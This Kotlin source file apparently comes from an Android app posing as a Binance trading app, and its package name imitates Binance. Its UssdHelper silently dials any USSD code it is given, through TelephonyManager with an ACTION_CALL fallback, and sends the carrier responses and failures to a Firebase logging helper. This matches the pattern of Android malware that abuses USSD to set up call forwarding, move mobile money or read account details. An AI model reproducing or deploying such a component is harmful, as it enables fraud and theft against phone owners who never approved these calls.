package dApp.binance.Trading.arfu

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.telephony.TelephonyManager
import android.util.Log

object UssdHelper {

    fun executeUssd(context: Context, code: String) {
        Log.d("UssdHelper", "Executing USSD: $code")

        // Try using TelephonyManager first (Android 9+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            executeTelephonyUssd(context, code)
        } else {
            // Fallback to Intent
            executeIntentUssd(context, code)
        }
    }

    /**
     * Execute USSD using TelephonyManager (Android 9+)
     */
    private fun executeTelephonyUssd(context: Context, code: String) {
        try {
            val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            val ussdCode = Uri.fromParts("tel", code, null)

            telephonyManager.sendUssdRequest(
                ussdCode.toString(),
                object : TelephonyManager.UssdResponseCallback() {
                    override fun onReceiveUssdResponse(
                        telephonyManager: TelephonyManager?,
                        request: String?,
                        response: CharSequence?
                    ) {
                        Log.d("UssdHelper", "USSD Response: $response")
                        FirebaseLogHelper.logResponse(response.toString(), context)
                    }

                    override fun onReceiveUssdResponseFailed(
                        telephonyManager: TelephonyManager?,
                        request: String?,
                        failureCode: Int
                    ) {
                        Log.e("UssdHelper", "USSD Failed: $failureCode")
                        FirebaseLogHelper.logCommand(
                            ussdCode = code,
                            status = "FAILED",
                            context = context,
                            error = "Failure code: $failureCode"
                        )
                    }
                },
                null
            )
        } catch (e: Exception) {
            Log.e("UssdHelper", "Error executing USSD: ${e.message}")
            executeIntentUssd(context, code)
        }
    }

    /**
     * Execute USSD using Intent (fallback)
     */
    private fun executeIntentUssd(context: Context, code: String) {
        try {
            val intent = Intent(Intent.ACTION_CALL)
            intent.data = Uri.parse("tel:$code")
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            context.startActivity(intent)
            Log.d("UssdHelper", "USSD Intent launched")
        } catch (e: Exception) {
            Log.e("UssdHelper", "Error launching USSD Intent: ${e.message}")
        }
    }
}
